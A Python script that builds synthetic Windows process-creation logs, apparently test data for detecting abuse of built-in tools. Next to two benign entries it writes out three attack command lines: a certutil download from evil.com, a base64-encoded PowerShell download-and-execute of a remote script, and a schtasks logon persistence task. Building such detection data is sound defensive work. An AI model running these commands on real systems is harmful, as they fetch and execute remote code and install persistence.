import json
import uuid
import datetime

def generate_logs():
    logs = [
        # Normal Usage Scenarios
        {
            "UtcTime": datetime.datetime.now().isoformat(),
            "ProcessGuid": str(uuid.uuid4()),
            "ProcessId": 1234,
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -hashfile existing_file.txt SHA256",
            "User": "DOMAIN\\User",
            "process_name": "certutil.exe", # Compatibility key
            "command_line": "certutil.exe -hashfile existing_file.txt SHA256" # Compatibility key
        },
        {
            "UtcTime": datetime.datetime.now().isoformat(),
            "ProcessGuid": str(uuid.uuid4()),
            "ProcessId": 5678,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe Get-Date",
            "User": "DOMAIN\\User",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe Get-Date"
        },
        
        # Attack Scenarios
        # 1. CertUtil Download
        {
            "UtcTime": datetime.datetime.now().isoformat(),
            "ProcessGuid": str(uuid.uuid4()),
            "ProcessId": 9999,
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/malware.exe",
            "User": "DOMAIN\\Attacker",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/malware.exe"
        },
        # 2. PowerShell Encoded Command
        {
            "UtcTime": datetime.datetime.now().isoformat(),
            "ProcessGuid": str(uuid.uuid4()),
            "ProcessId": 8888,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS9ydW4ucHMxJyk=",
            "User": "DOMAIN\\Attacker",
            "process_name": "powershell.exe",
            "command_line": "powershell -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS9ydW4ucHMxJyk="
        },
        # 3. Schtasks Persistence
        {
            "UtcTime": datetime.datetime.now().isoformat(),
            "ProcessGuid": str(uuid.uuid4()),
            "ProcessId": 7777,
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\malware.exe\" /sc onlogon",
            "User": "DOMAIN\\Attacker",
            "process_name": "schtasks.exe",
            "command_line": "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\malware.exe\" /sc onlogon"
        }
    ]
    
    return json.dumps(logs, indent=4)

if __name__ == "__main__":
    print(generate_logs())
